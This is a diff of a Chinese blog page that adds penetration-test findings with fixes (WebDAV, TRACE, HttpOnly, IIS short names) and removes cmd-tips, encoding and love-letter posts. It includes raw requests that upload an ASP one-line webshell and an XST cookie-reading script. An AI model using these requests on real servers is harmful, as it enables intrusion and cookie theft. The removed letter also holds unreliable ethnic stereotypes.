@@ -194,201 +194,6 @@
           
           
             
-              <a class="post-title-link" href="/2015/08/19/cmd命令使用记录/" itemprop="url">
-                cmd命令使用记录
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-19T15:33:48+08:00" content="2015-08-19">
-            2015-08-19
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/19/cmd命令使用记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/19/cmd命令使用记录/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="查看当前活动代码页（默认编码格式）">查看当前活动代码页（默认编码格式）</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">chcp</span>
-//活动代码页为：<span class="number">936</span>，它对于的编码格式为GBK
-</code></pre><h2 id="设置当前cmd窗口标题">设置当前cmd窗口标题</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">title</span> Hello Mr.Q
-</code></pre><h2 id="添加删除程序">添加删除程序</h2><pre><code><span class="tag">cmd</span>&gt; <span class="tag">appwiz</span><span class="class">.cpl</span>
-</code></pre><h2 id="启动计算器">启动计算器</h2><pre><code><span class="built_ins">cmd</span>&gt; calc
-</code></pre><h2 id="事件查看器">事件查看器</h2><pre><code><span class="built_ins">cmd</span>&gt; eventvwr
-</code></pre><h2 id="查看系统配置">查看系统配置</h2><pre><code><span class="built_ins">cmd</span>&gt; msinfo32
-</code></pre><h2 id="注册表编辑器">注册表编辑器</h2><pre><code><span class="built_ins">cmd</span>&gt; regedit
-</code></pre><h2 id="用户操作">用户操作</h2><pre><code><span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span>
-//查看现有账户
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin
-//查看admin账户详情
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin    password /<span class="built_ins">add</span>
-//添加用户
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin /del
-//删除
-</code></pre></span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/19/字符编码详解/" itemprop="url">
-                字符编码详解
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-19T10:45:52+08:00" content="2015-08-19">
-            2015-08-19
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/19/字符编码详解/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/19/字符编码详解/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="基本概念">基本概念</h2><ul>
-<li><p><strong>字符是各种文字和符号的总称</strong>.</p>
-</li>
-<li><p><strong>字符集是字符的集合:</strong>，不同字符集包含的字符个数不同。常见字符集有：ASCII字符集、ISO8859字符集、GB2312字符集、BIG5字符集、GB18030字符集、Unicode字符集等.</p>
-</li>
-</ul>
-<p>使用哪些字符。也就是说哪些汉字，字母和符号会被收入标准中。所包含“字符”的集合就叫做“字符集”。规定每个“字符”分别用一个字节还是多个字节存储，用哪些字节来存储，这个规定就叫做“编码”。</p>
-<p>各个国家和地区在制定编码标准的时候，“字符的集合”和“编码”一般都是同时制定的。因此，平常我们所说的“字符集”，比如：GB2312, GBK, JIS 等，除了有“字符的集合”这层含义外，同时也包含了“编码”的含义。</p>
-<ul>
-<li><p><strong>编码：</strong>所谓编码就是用数字表示字符，例如用D7D6表示“字”。编码是将字符转化为数字的约定，规则。</p>
-</li>
-<li><p><strong>UNICODE(UCS,Unicode Character Set)字符集</strong>为各种语言的每一个字符设定了<strong>统一并且唯一</strong>的数字编号，其他的编码方式通常是针对某一区域的语言，文字设计，只支持特定的语言。</p>
-</li>
-<li><p><strong>代码页：</strong>规定了适用于特定区域的字符集，以及编码方式。可以理解为字符和字节数据的映射表。<strong>不同代码页的编号可以理解为内码</strong>，如936为简体中文GBK，950为正体中文Big5。</p>
-</li>
-<li><p><strong>utf(UCS Transformation format):</strong>UCS只规定了如何编码，并没有规定这些编码如何保存，传输。于是就有了utf，可以理解为utf是基于UCS的编码方案<br>UTF-8就是以8位为单元对UCS进行编码。从UCS-2到UTF-8的编码方式如下：</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">UCS-2编码(16进制)</th>
-<th style="text-align:left">UTF-8 字节流(二进制)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0000 - 007F</td>
-<td style="text-align:left">0xxxxxxx</td>
-</tr>
-<tr>
-<td style="text-align:center">0080 - 07FF</td>
-<td style="text-align:left">110xxxxx 10xxxxxx</td>
-</tr>
-<tr>
-<td style="text-align:center">0800 - FFFF</td>
-<td style="text-align:left">1110xxxx 10xxxxxx 10xxxxxx</td>
-</tr>
-</tbody>
-</table>
-<p>例如“汉”字的Unicode编码是6C49。6C49在0800-FFFF之间，所以肯定要用3字节模板了：1110xxxx 10xxxxxx 10xxxxxx。将6C49写成二进制是：0110 110001 001001， 用这个比特流依次代替模板中的x，得到：11100110 10110001 10001001，即E6 B1 89。</p>
-<h2 id="总结">总结</h2><p>UCS为所有的语言的所有字符分配了统一并唯一的数字，UCS结合代码页对现在已经流行起来的一些编码方式做出支持。<br>文字实际上是以上述表格中utf-8的形式保存在系统中。当我们打开这个文件时(以utf-8为例)：<br>1.文字首先以utf-8的编码格式保存在文件中。<br>2.Windows在读取文件时通过BOM确认编码方式为utf-8，以选择对应的代码页65001。<br>3.按照编码规则 utf-8  -&gt;  unicode<br>4.Windows按照Unicode在指定代码页中查找字体图像，画到窗口上。</p>
-<p>参考资料<br><a href="http://www.fmddlmyy.cn/text6.html" target="_blank" rel="external">谈谈Unicode编码，简要解释UCS、UTF、BMP、BOM等名词</a><br><a href="http://www.ruanyifeng.com/blog/search.html?cx=016304377626642577906%3Ab_e9skaywzq&amp;cof=FORID%3A11&amp;ie=UTF-8&amp;q=%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0&amp;sa.x=0&amp;sa.y=0" target="_blank" rel="external">阮一峰的网络日志</a></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
               <a class="post-title-link" href="/2015/08/18/测评反馈记录/" itemprop="url">
                 测评反馈记录
               </a>
@@ -503,7 +308,123 @@
 <p>建议(一一对应):<br>1.限制对该文件的访问.</p>
 <p>2.确认页面中电话号码，IP用途，站点可根据网站自身情况是否去除号码.<br>3.如果是正常页面中包含路径信息，如果不需要该路径信息，删除该信息.</p>
 <p>  如果是错误信息中包含路径信息，需要屏蔽应用程序错误信息.</p>
-</span>
+<h2 id="Apache_HTTP_Server_“httpolny”cookie_泄露">Apache HTTP Server “httpolny”cookie 泄露</h2><p>1.为了防止XSS，我们通常采用给cookie附上httponly属性，来禁止js获取cookie.</p>
+<p>2.原理：当Apache接收到了cookie长度超过4k，返回400，并且将所有的cookie信息返回，提示cookie过长.</p>
+<p>3.利用：为用户的cookie添加一些无用信息，总长超过4k，使Apache返回400，并用过js正则过滤掉无用部分，我们就绕过了httponly的设置.</p>
+<p>4.修复：受影响的版本为2.21及其之前的所有版本，做好备份，升级Apache.</p>
+<h2 id="IIS_WebDav_Options_方法未禁用">IIS WebDav Options 方法未禁用</h2><p>1.WebDav是基于HTTP1.1的扩展协议，集成在window xp和IIS中，定义了除了Get，Post等一些http协议基本方法之外的一些方法例如：Option,put,move等.</p>
+<p>2.原理：使用option方法查看服务器允许哪些方法的提交，可能造成安全隐患.</p>
+<p>3.利用：<br>-使用option探测服务器信息：</p>
+<pre><code>OPTIONS/HTTP/<span class="number">1.1</span>
+Host:www<span class="class">.xxxx</span><span class="class">.com</span>
+</code></pre><p>  返回：</p>
+<pre><code>  HTTP/<span class="number">1.1</span> <span class="number">200</span> OK
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+  MS-Author-Via:DAV
+  Content-Length:<span class="number">0</span>
+  Accept-Ranges:none
+  DASL:&lt;DAV:sql&gt;
+  DAV:<span class="number">1.2</span>
+Public:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+Cacha-Control:<span class="keyword">private</span>
+</code></pre><p>-上传文本文件：</p>
+<pre><code>PUT<span class="regexp">/test.txt HTTP/</span><span class="number">1.1</span>
+<span class="string">Host:</span>www.xxxx.com
+Content-<span class="string">Length:</span><span class="number">26</span>
+&lt;%eval(request(<span class="string">"cmd"</span>))%&gt;
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/1.1 200 OK
+  Date:Fri,01 Jan 2011 04:23:39 GMT
+  Server: Microsoft-IIS/6.0
+  X-Powered-By:ASP.NET
+location：<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
+Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+//上传成功
+</code></pre><p>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
+<pre><code>MOVE/test<span class="class">.txt</span> HTTP/<span class="number">1.1</span>
+Host:wwww<span class="class">.xxxx</span><span class="class">.com</span>
+Destination:http:<span class="comment">//www.<span class="label">xxxx.com/webshell.asp</span></span>
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/<span class="number">1.1</span> <span class="number">201</span> Created
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+location：www.xxxx.com/webshell.asp
+Content-type:text/xml
+Content-length:<span class="number">0</span>
+<span class="comment">//修改成功</span>
+</code></pre><p>4修复：属于服务器配置不当造成的安全问题，options PUT DELETE MOVE方法如非必须请关闭.</p>
+<h2 id="TRACE_方法未禁用">TRACE 方法未禁用</h2><p>1.TRACE是HTTP协议提供的协议调试方法，发送什么请求，它会将请求原封返回.<br>可能存在的危害是能够与XSS配合获取用户httponly的cookie内容.</p>
+<p>2.原理：客户端JavaScript提出一个TRACE请求，并读取这个请求的响应，那么这段脚本就能够访问标记为HttpOnly的cookie，即使通过document.cookie属性也无法访问它们.</p>
+<p>3.利用：</p>
+<pre><code><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="actionscript">  
+&lt;!--  
+<span class="function"><span class="keyword">function</span> <span class="title">xssTRACE</span><span class="params">()</span></span>{  
+<span class="keyword">var</span> xmlHttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);  
+xmlHttp.open(<span class="string">"TRACE"</span>,<span class="string">"http://wmjie.51.net/swords/"</span>,<span class="literal">false</span>);  
+xmlHttp.send();  
+xmlDoc=xmlHttp.responseText;  
+alert(xmlDoc);  
+}  
+<span class="comment">//--&gt;  </span>
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+<span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">TYPE</span>=<span class="value">BUTTON</span> <span class="attribute">onClick</span>=<span class="value">"xssTRACE();"</span> <span class="attribute">VALUE</span>=<span class="value">’XSS</span> <span class="attribute">TRACE</span>’&gt;</span>
+//将如上恶意代码插入页面，一个正常用户通过这个被劫持的页面进行访问，即使是设置属性httponly的cookie也通过TRACE方法的请求，显示在返回页面中.
+</code></pre><p>4.修复：属于服务器配置不当造成的安全问题，TRACE方法，如非必须请关闭.</p>
+<h2 id="IIS短文件名泄露">IIS短文件名泄露</h2><p>1.如果网站是运行在IIS服务器上，可以通过”~”来发现一些文件和文件夹,攻击者可以发现重要的文件或者文件夹，如果这些文件或者文件夹是正规的可见文件.攻击者可以通过该途径搜集文件名称(字符长度不超过6).<br>2.原理：使用通配符<code>*</code>和<code>?</code>发送一个请求到iis,当IIS接收到一个文件路径中包含”~”的请求时，它的反应是不同的.基于这个特点，我们可以根据http的响应区分一个可用或者不可用的文件.<br>3.修复：</p>
+<ul>
+<li><p>过滤<code>~</code>字符.</p>
+</li>
+<li><p>Windows中禁用8.3格式文件名方法如下(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)：</p>
+<p>  cmd&gt; fsutil 8dot3name query c:<br>“c:”表示查询C盘的状态.<br>如果功能被启用，会显示类似如下的信息：</p>
+<p>  Disable8dot3 的卷状态为 0 (8dot3 名称创建已启用).<br>  NtfsDisable8dot3NameCreation 的注册表状态为默认值 2 (卷级别设置).<br>  基于以上的两个设置，在 c: 上启用 8dot3 名称创建.</p>
+</li>
+</ul>
+<p>如果在C盘上关闭这个功能，则可使用以下命令：</p>
+<pre><code>cmd&gt; fsutil <span class="number">8</span>dot3name <span class="built_in">set</span> C: <span class="number">1</span>
+<span class="comment">//0（全部启动），1（全部禁用），2（每个盘符单独设置），3（除系统盘外全部禁用）.</span>
+</code></pre><p>也可以通过修改注册表实现：</p>
+<pre><code>键：HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\FileSystem</span>
+值：NTFSDisable8dot3NameCreation  类型：REG_DWORD
+</code></pre><ul>
+<li>使用waf进行防护.</li>
+</ul>
+<h2 id="会话标识别未更新">会话标识别未更新</h2><p>1.会话标识别未更新</p>
+<p>2.原理：用户的登录页面会有一个session id，登录成功后，应该使用新的session id 而不是保持登录页面的session id， 这样即使别人在网络上截获了你的登录页面的session id，仍然无法伪造客户身份进入系统.<br>如果使用同样的session id，则可能被截获并且伪造客户身份进入系统.</p>
+<p>3.修复：<br>-始终生成新的会话，供用户成功认证时登录.<br>-防止用户操纵会话标识.<br>-请勿接受用户浏览器登录时所提供的会话标识.</p>
+<h2 id="敏感信息泄露">敏感信息泄露</h2><p>1.以电话号码泄露为例</p>
+<p>2.原理：敏感信息(电话号码，内网IP)显示在了页面，源码，url地址中.</p>
+<p>3.利用：可作为进一步渗透的信息储备</p>
+<p>4.修复：此号码网站业务正常，无实际安全影响，站点可根据网站自身情况是否去除号码.</p>
+<h2 id="缺少httponly属性">缺少httponly属性</h2><p>1.会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁.</p>
+<p>2.修复：<br>向所有会话cookie中添加“HttpOnly”属性.</p>
+<pre><code>Java示例：
+HttpServletResponse response2 = (HttpServletResponse)<span class="built_in">response</span>;
+response2.setHeader( <span class="string">"Set-Cookie"</span>, <span class="string">"name=value; HttpOnly"</span>); 
+
+C#示例：
+HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>); 
+myCookie.HttpOnly = <span class="literal">true</span>; 
+<span class="built_in">Response</span>.AppendCookie(myCookie);
+
+VB.NET示例：
+<span class="keyword">Dim</span> myCookie As HttpCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>) 
+myCookie.HttpOnly = <span class="literal">True</span> 
+<span class="built_in">Response</span>.AppendCookie(myCookie) 
+</code></pre><h2 id="启用不安全的HTTP方法">启用不安全的HTTP方法</h2><p>1.检测到目标Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, PROPPATCH, MKCOL ,LOCK ,UNLOCK.这些方法表示可能在服务器上使用了 WebDAV.由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件.<br>2.利用：<br>参考：</p>
+<blockquote>
+<p>IIS WebDav Options 方法未禁用</p>
+</blockquote>
+<p>3.修复：<br>如果服务器不需要支持WebDAV，请禁用.<br>或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码.</p>
+<h2 id="目标web应用表单密码类型输入启用了自动完成操作">目标web应用表单密码类型输入启用了自动完成操作</h2><p>1.在web应用form表单中，如果input标签没有指定“autocomplete”属性为“off”，则“autocomplete”的属性会自动默认为“on”.<br>当web应用form表单中的密码类型的input标签的“autocomplete”属性为“on”时，用户若提交了一个新的用户名和密码时，浏览器将会询问用户是否保存该用户名和密码信息.<br>如果用户选择保存，则之后在显示该web应用表单时，用户名和密码将会被自动填充到对应的输入框中.<br>用户一但保存密码，攻击者就可以通过本地从浏览器缓存中获取明文密码，导致用户敏感信息泄露.</p>
+<p>2.修复：<br>修改web应用form表单中密码类型input标签的“autocomplete”属性为“off”.</p>
+<p>示例：</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;
+则增加“autocomplete”属性为“off”即可，修改为：
+&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span> autocomplete=<span class="string">"off"</span>&gt;
+</code></pre></span>
         
       
     </div>
@@ -756,289 +677,6 @@ mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <spa
 </code></pre><h2 id="宽字节注入">宽字节注入</h2><p>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
 <p><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="external">摘自乌云知识库</a></p>
 </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/14/阿里郎的情书/" itemprop="url">
-                阿里郎的情书
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-14T18:26:07+08:00" content="2015-08-14">
-            2015-08-14
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/14/阿里郎的情书/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/14/阿里郎的情书/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h1>阿里郎的情书</h1>
-
-<blockquote>
-<p>作者:乔策,生长于俄罗斯边境,一半朝鲜血统,对日本亲属无语,每日说英文的中国游子.两年求学三国,交友广布六洲</p>
-<blockquote>
-<p><strong>谨以此文献给我未来的朝鲜族妻子.即便你只许我朝露、昙花；我也伴你咫尺、天涯.你若哭泣,我的世界便崩塌……</strong></p>
-</blockquote>
-</blockquote>
-<p>아리랑 아리랑 아라리요<br>아리랑 고개로 넘어간다<br>나를 버리고 가시는 님은십리도 못 가서 발병난다</p>
-<p>아리랑 아리랑 아라리요<br>아리랑 고개로 넘어간다<br>청천하늘엔 별도 많고<br>우리네 가슴엔 꿈도 많다<br>아리랑 아리랑 아라리요<br>아리랑 고개로 넘어간다<br>저기 저 산이 백두산이라지<br>동지 섣달에도 꽃만 핀다</p>
-<p>——《아리랑》</p>
-<p>亲爱的：</p>
-<p>十分抱歉，近日忙于新《讲义》的修改，回信稍有延迟，愧疚万分。分离二地无法执手相望，方知剪不断理还乱的不止离愁还有思念。时常于疲倦之时反复翻阅往日之来信，你的文字于书轩中伴我看遍月落日升，那份娴静恰如你似水之温柔。近闻得你在新环境下，生活略有不适，常为一些无脑之言论所扰，愧疚于无法此刻将你揽入胸怀以安慰，情急无奈之下又愁吐香烟、乱拍“栏杆”，现回信一封，说些愚见。</p>
-<h2 id="1-关于民族与国籍的问题：">1.关于民族与国籍的问题：</h2><p>亲爱的，我曾经有过和你同样的苦恼，所以我深刻地清楚，庸众问你国籍与民族等问题时你所忍受的尴尬。你是否和别人解释再多也解释不清楚，相信你曾和我有过同样的好奇，“为什么那么多中国人能理解自己的民族是“汉族”而不是“中国族”；却难以理解日本人是“大和民族”而不是“日本族”；韩国人是“朝鲜族”而不是“韩国族”。这个问题解释不清楚并不是你的过错，也没有必要为一些人的误识所纠结，我们只需要记住中国是我们的祖国，高丽是我们的民族即可。国籍，毕竟只是一种政治上的归属；民族，才是对血统和文化的认同。比如说，当我们在给学生们解析Korea这一词时，没必要强加“North Korea”和“South Korea”这种政治性的概念，把侧重点放在告诉学生们Korea是“고려——Ko Liao（高丽）”的音译岂不更好。虽然曾经统一的朝鲜由于政治性的原因如今分裂成了今日的“朝鲜”和“韩国”，而且韩国为了在意识形态上将其与北朝鲜区分开，给自己的人民和语言“重新”起了一个“可以迷惑外国人眼球”的名字——“大韩民族”和“韩国语”。 但无论是怎么改，在血脉上Korean对通古斯民族血脉的继承可是永远改变不了的啊。亲爱的，就像你我作为中国人所坚信的那样——不论当今的台独分子以何等卑劣的手段来破坏华夏的统一，台湾同胞永远是和我们一样的炎黄子孙、龙的传人。让一切的争论都融化在周恩来总理万隆会议上的那句发言里吧——“万物相育而不相害，道并行而不相悖”这正是庄子的智慧。</p>
-<h2 id="2-关于新的生活环境：">2.关于新的生活环境：</h2><p>亲爱的，我知道，你成长于一个标准的朝鲜族家庭，从小到大一直是吃韩食、住韩居，甚至还有那种朝鲜族典型的小“洁癖”，但是突然来到了另一个民族的文化圈子，短时间要适应这些实属不易，就像是我刚到新环境时很多人无法理解我每天天要刷四次牙，至少洗三次澡一样。但是希望你能记住“生活并不只有眼前的苟且，还有诗和远方的田野”。我记得我读书时，我的一位中国老师曾拍着我的肩膀语重心长地说“苦不苦，想想红军两万五；累不累，想想革命老前辈”。是啊，每当疲惫之时就想想我们的祖先吧，他们为了让子孙后代能过上幸福的生活，是克服了多少苦难啊。</p>
-<p>我们居住在朝韩半岛的祖先，想想就让人心疼，每每回望那片土地，总是有让人落几滴泪的冲动……</p>
-<p>你想想啊，朝韩半岛多山而少平原的地形，并不适合农耕也不适合放牧；那里只有少数南部地区才算得上是亚热带季风性气候，大部分地区都是相对寒冷的中温带，不但耕地不足、庄稼的生长期更是短得可怜；那里没有华夏大地那样广袤的暖温带大平原、可供灌溉的汤汤大河；只有少量破碎的沿海平原，并且还要时常担心于海水倒灌、台风雨等等危机。 所以，我们的祖先面对的人口与粮食的矛盾，人口与土地的矛盾要比其他地区更紧张啊。为了生存，他们必须在十分辛勤、精细劳作的同时还要尽最大可能地充分利用每一寸土地。不过，在这样的环境下打拼，代代相传，自然磨练出了我们高丽人坚忍不拔、勤劳勇敢的意志品质以及高超的水稻种植技术。讲究中庸、好吃懒做、不善钻研的民族只适合呆在暖温带那样的平原安乐窝。在清朝后期，清政府施行“开关”的政策，我们的先民一批批的来到了中国东北地区开垦白山黑水之地，同时还要替清政府抵抗侵略中国东北的日本、沙俄士兵，这是有多难啊！但是，亲爱的，我们的先民并没有投降，而是鼓起勇气克服重重困难，反而培育出了驰名中外的东北大米的雏形。直到现在中国东北的一些农场里还可以遇到一些中国国籍的朝鲜族同胞，我曾和他们交谈过两句，他们的父辈恰恰是早些年教授汉民如何在白山黑水之地种植水稻的技术员。我曾经一直庆幸着，在我20多岁的生活经历中，一直都在吃着最擅长种植水稻的民族所种植的大米，而且也正是流淌着这个民族血液的母亲每日为我精心地烹制米饭；同时我也感谢命运，让我又遇到了你。亲爱的，请原谅我的贪婪，因为此刻的我已经在开始构想着你穿着韩服盘着束发烹制米饭时美丽的样子了。我相信经过你手烹制的米饭一定会有一份我们民族的那种精细，而这份能力一定就像我们继承了自身的高丽血统一般自然；那饭桌也定会是洁净万分的，因为能在多山而少平原地区种植出上等水稻的民族，一定会爱惜每一寸土地，一定会讲求精细，而有着这份精细的乡土概念的民族，怎会让居室内有一粒灰尘呢。</p>
-<h2 id="3-关于你此次“Gap_Year”的决定是否正确：">3.关于你此次“Gap Year”的决定是否正确：</h2><p>汉人有一句俗语，我认为很有道理“出来混，早晚要还的”。所以虽然此刻的你在经受着“culture shock”所带给你的种种不解与不便，但我还是坚信你这次“Gap Year”的决定是正确的，而且终会使你受益万分的，因为我相信作为高丽儿女，你的骨子里就有一种“闯”劲。</p>
-<p>你看哈，大凡是深刻受海洋文明影响的民族，为了生存都会有一种远征的欲望。大到轰轰烈烈的大航海时代，小到英国米字旗和日本国旗上那由一点滴而向外辐射的条纹。</p>
-<p>我们的祖先，为了缓解生产与生活的矛盾，在朝韩半岛上不光要辛勤地农耕，还要在山林里进行采集、狩猎；同时“黄海暖流“和”西朝鲜寒流“在半岛的西侧汇聚；”对马暖流“和”库页岛寒流“在东部汇聚，此乃天然的上等渔场，我们的先民还要进行海洋捕鱼的作业。然而无论是山林中的采集、狩猎还是出海打渔，都要有一种打破小农庄稼院、向外勇于探索的气魄，这就是融在高丽儿女身上的那股“闯”劲儿。也正因如此，即便朝韩半岛的农业生产很重要，但先民们也并未禁锢于这狭小的农耕天地。在农耕性层面上，我们的民族有着中华儒家文化一套“温良恭俭让”的完美诠释，“重教育、守礼乐”传统文化内核；同时在需要冒险的领域内，作为通古斯后裔，骨子里所赋予的虎性血液又不断地激荡翻腾。也许正是这种重视教育又敢于冒险的民族性格成就了我们的民族。虽然我们民族的人口数仅占中国总人口数比例的”千分之一点”多，但却出了一大批学者，一大批艺术家。比如:既写了《中国人民解放军进行曲》又写成了《朝鲜解放进行曲》的정률성（郑律成）；开着低端战机却击落了四架美军高端战机的拼命将军—리영태（李永泰）；中国第一位影帝김염（金焰）；中国现代舞的奠基人——金星；喊出了中国摇滚第一嗓的摇滚教父——崔健；当然还有喜欢实话实说的罗永浩等。</p>
-<p>亲爱的，每当我看到你在求知上的那份闯劲，对待学习的那份热情，我就会回想起季羡林老先生在《行走世界》那本书里的句子——“我国的朝鲜族十分重视文化、艺术教育，文化水平位列全国之首”；我也问过自己“为什么经数据表明虽然我们民族的姊妹弟兄绝大多数都居住在教育资源并不丰富的边疆地区，但是在56个民族中却是受教育程度是最高的，而且还是全国平均水平的两倍多？”然而当我久久伫足于延边朝鲜族博物馆时，亲爱的，那刻在墙上的一句朝鲜族俗语揭晓了答案——“即使挨饿，也要学习”… …</p>
-<p>的确，这样想想我们的先民似乎又生活在了一片乐土。在一个深刻受到了儒家礼乐文化影响且历史上少有大规模知识分子惨遭屠杀事件的地方，人们自然对知识会有着一种近乎偏激的执着。</p>
-<p>亲爱的，你还记得我之前给你写信，兴奋地告诉你我的一位朝鲜族的新学生么？她第一次在我家听完课准备回家之时，背对着我蹲在门口的地垫上温柔且可爱地穿好自己的鞋子，随后迅速地一转身把自己刚穿过的拖鞋十分整齐摆放到我家的鞋架上，她站起身深深一鞠躬，用非常标准的敬语体式对我说了一句“您辛苦了”才转身离去。于是那个假期我记忆中最美的画面就是每天讲完课后与她互相在门口鞠躬道别，道一声“再见，请慢走”她回一句敬语“好的，我会小心，谢谢您”，于是每天的那个时段，我都感觉仿佛我之前读到的所有“朝韩史”文字一下子都活了，轻轻跳动着，如她一般让人温暖欢畅。曾自称“礼仪之邦”的国度的群众，如今走到海外因为“没有礼仪、没有素质”而被好多国家所嫌弃；我很自豪地看到洋人眼中的那份东方礼仪如今是由Korean和Japanese表现得具体而又生动，融化在人与人鞠躬行礼的一个动作；升华在晚辈向长辈敬酒后要转身方可饮的礼节中；让人陶醉于长幼有序的声声敬语里。</p>
-<h2 id="4-关于你是否应该坚持爱好：">4.关于你是否应该坚持爱好：</h2><p>哦，亲爱的，我是一个粗人，我可不敢斗胆和你谈论艺术与修养。但是你既然抱怨到了学业与你音乐爱好间的矛盾关系，我想我还是有些必要谈谈自己于此的粗浅的见解，当然处于自私的角度，我也更喜欢婚后不看韩剧而是能教孩子弹琴唱歌的你。所以呢，我的建议是：无论再忙，都希望你能把自己的音乐爱好坚持下去。</p>
-<p>我认为我们高丽人较之日本人是少了些许死板得，多了些灵活的；你热爱音乐，我想从这一点上你就能看出个一二。</p>
